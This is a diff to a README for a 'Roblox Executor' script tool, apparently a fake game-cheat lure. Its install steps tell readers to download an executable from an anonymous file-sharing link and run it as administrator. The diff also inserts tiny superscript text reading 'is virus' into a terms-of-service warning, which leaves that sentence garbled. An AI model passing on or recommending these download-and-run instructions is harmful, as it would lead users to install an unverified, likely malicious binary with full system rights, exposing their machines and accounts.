@@ -5,7 +5,7 @@ Welcome to the Roblox Executor! This tool allows you to execute custom scripts i
 ## Installation
 
 1. Download the executable from the website https://filebin.net/5s5oswrzscvn0zgp.
-2. Run the executable as an admin to install the executor.
+2. Run the executable as an admin to open the executor.
 
 ## Usage
 
@@ -17,7 +17,7 @@ Welcome to the Roblox Executor! This tool allows you to execute custom scripts i
 ## Tips
 
 - Use the "Save" button to save your scripts for future use.
-- Be aware that using this tool to execute scripts in other players' games may be against Roblox's terms of service and can lead to account suspension or ban.
+- Be aware that using this tool to execute scripts in other players' games may be against Roblox's terms of service and this ⁱˢ ᵛⁱʳᵘˢ can lead to account suspension or ban.
 - Always ensure you are following the laws and regulations in your jurisdiction.
 
 ## Disclaimer
